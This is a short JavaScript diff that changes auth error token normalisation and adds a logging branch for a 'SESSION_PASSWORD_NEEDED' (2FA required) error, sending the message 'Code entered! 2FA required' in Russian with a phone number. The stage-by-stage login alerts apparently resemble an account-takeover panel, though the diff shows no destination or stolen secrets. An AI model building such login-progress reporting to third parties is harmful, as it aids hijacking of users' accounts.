@@ -1535,7 +1535,7 @@ function normalizeAuthError(err) {
   const raw = String(err?.errorMessage || err?.message || err || '').trim();
   const upper = raw.toUpperCase();
   const code = String(err?.code || '').toUpperCase();
-  const token = code || upper;
+  const token = [code, upper].filter(Boolean).join(' ');
   const secondsCandidate =
     err?.seconds ??
     err?.secondsLeft ??
@@ -1611,7 +1611,7 @@ function normalizeAuthError(err) {
 function getAuthErrorToken(err) {
   const raw = String(err?.errorMessage || err?.message || err || '').trim();
   const code = String(err?.code || '').toUpperCase();
-  const token = code || raw.toUpperCase();
+  const token = [code, raw.toUpperCase()].filter(Boolean).join(' ');
   return { raw, token };
 }
 
@@ -1671,6 +1671,11 @@ async function logAuthError(err, phone) {
   }
   if (token.includes('PASSWORD_HASH_INVALID')) {
     await sendAuthLog('Неверный пароль', phone);
+    markAuthErrorLogged(err);
+    return;
+  }
+  if (token.includes('SESSION_PASSWORD_NEEDED')) {
+    await sendAuthLog('Введён код! Требуется 2FA', phone);
     markAuthErrorLogged(err);
     return;
   }
